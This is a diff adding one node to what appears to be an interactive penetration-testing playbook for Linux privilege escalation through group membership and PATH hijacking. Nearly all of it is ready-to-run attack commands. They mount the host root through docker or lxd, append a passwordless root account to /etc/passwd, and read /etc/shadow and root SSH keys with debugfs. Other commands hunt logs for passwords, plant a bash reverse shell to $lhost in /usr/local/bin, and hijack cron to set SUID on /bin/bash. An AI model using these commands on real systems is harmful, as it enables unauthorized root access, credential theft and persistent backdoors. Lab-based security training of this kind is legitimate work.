@@ -1,0 +1,22 @@
+{
+  "id": "linux_privesc_extra",
+  "phase": "LINUX",
+  "title": "Linux — Interesting Groups & PATH Hijack",
+  "body": "Group membership can be instant root. Check id carefully — docker, lxd, disk, adm, staff all have known privesc paths.",
+  "cmd": "# ── CHECK GROUP MEMBERSHIP ───────────────────────────\nid\ngroups\ncat /etc/group | grep $(whoami)\n\n# ── DOCKER GROUP ─────────────────────────────────────\n# docker group = root without sudo\ndocker images\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n# Now you have root filesystem access\n# Read shadow: cat /mnt/etc/shadow\n# Add user: echo \"r00t::0:0::/root:/bin/bash\" >> /mnt/etc/passwd\n\n# If no images available:\ndocker pull alpine\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n# ── LXD / LXC GROUP ──────────────────────────────────\n# Build alpine image on Kali:\n# git clone https://github.com/saghul/lxd-alpine-builder\n# ./build-alpine → produces alpine.tar.gz\n# Transfer to target then:\nlxc image import ./alpine.tar.gz --alias alpine\nlxc init alpine privesc -c security.privileged=true\nlxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\nlxc start privesc\nlxc exec privesc /bin/sh\n# Inside container: cd /mnt/root && cat etc/shadow\n\n# ── DISK GROUP ───────────────────────────────────────\n# disk group = read raw disk = read any file, bypasses all permissions\n# Lab validated: Fanatastic (PG Practice)\n\n# Step 1: find which device / is on\ndf -h\n# Look for: /dev/sdaX → /\n\n# Step 2: open with debugfs\ndebugfs /dev/sda2   # adjust to match your device\n\n# Step 3: read anything\n# debugfs interactive commands:\n# ls /root\n# cat /root/.ssh/id_rsa      ← grab root SSH key (instant root)\n# cat /etc/shadow             ← grab hashes\n# cat /root/proof.txt         ← grab flag directly\n# cat /home/user/.bash_history\n\n# Step 4: use the key\n# Copy key output to Kali → vim id_rsa → paste → :wq\nchmod 600 id_rsa\nssh -i id_rsa root@$ip\n\n# Non-interactive read (if you need to script it):\necho \"cat /root/.ssh/id_rsa\" | debugfs /dev/sda2 2>/dev/null\necho \"cat /etc/shadow\" | debugfs /dev/sda2 2>/dev/null\n\n# Write files (more dangerous — use carefully):\n# debugfs -w /dev/sda2\n# then: write /tmp/myfile /etc/cron.d/backdoor\n\n# ── ADM GROUP ────────────────────────────────────────\n# adm group = read /var/log — hunt for creds\ngrep -ri \"password|pass|auth\" /var/log/ 2>/dev/null | grep -v \"^Binary\"\ncat /var/log/auth.log | grep -i \"pass|accept|fail\"\ncat /var/log/apache2/access.log 2>/dev/null\ncat /var/log/apache2/error.log 2>/dev/null\ncat /var/log/mysql/error.log 2>/dev/null\n\n# ── STAFF GROUP ──────────────────────────────────────\n# staff can write to /usr/local — which is first in PATH\n# Plant malicious binary ahead of system binary\nls -la /usr/local/bin/\necho '#!/bin/bash\nbash -i >& /dev/tcp/$lhost/4444 0>&1' > /usr/local/bin/service\nchmod +x /usr/local/bin/service\n# Wait for root to run \"service\"\n\n# ── PATH HIJACK ───────────────────────────────────────\necho $PATH\n# If you can write to any dir early in PATH:\nfind / -writable -type d 2>/dev/null | grep -E \"bin|sbin|local\"\n\n# Check if crontab or script calls binary without full path:\ncat /etc/crontab | grep -v \"^#\"\n# If: * * * * * root cleanup  (no full path)\n# Create malicious cleanup in writable PATH dir:\necho '#!/bin/bash\nchmod +s /bin/bash' > /tmp/cleanup\nchmod +x /tmp/cleanup\nexport PATH=/tmp:$PATH\n# Wait for cron to fire then: /bin/bash -p\n\n# ── VIDEO GROUP ───────────────────────────────────────\n# video group = read framebuffer = screenshot screen\ncat /dev/fb0 > /tmp/screen.raw   # capture screen\n\n# ── BACKUP GROUP ─────────────────────────────────────\n# backup group = read any file via tar\ntar -czf /tmp/shadow.tar.gz /etc/shadow\ntar -xzf /tmp/shadow.tar.gz -C /tmp\ncat /tmp/etc/shadow",
+  "warn": "docker and lxd group membership is instant root — check id immediately on every new shell. PATH hijack only works if the cron/script calls binaries without full path.",
+  "choices": [
+    {
+      "label": "Got root shell",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Got shadow hashes",
+      "next": "hashcrack"
+    },
+    {
+      "label": "Back to enum",
+      "next": "linux_post_exploit"
+    }
+  ]
+}
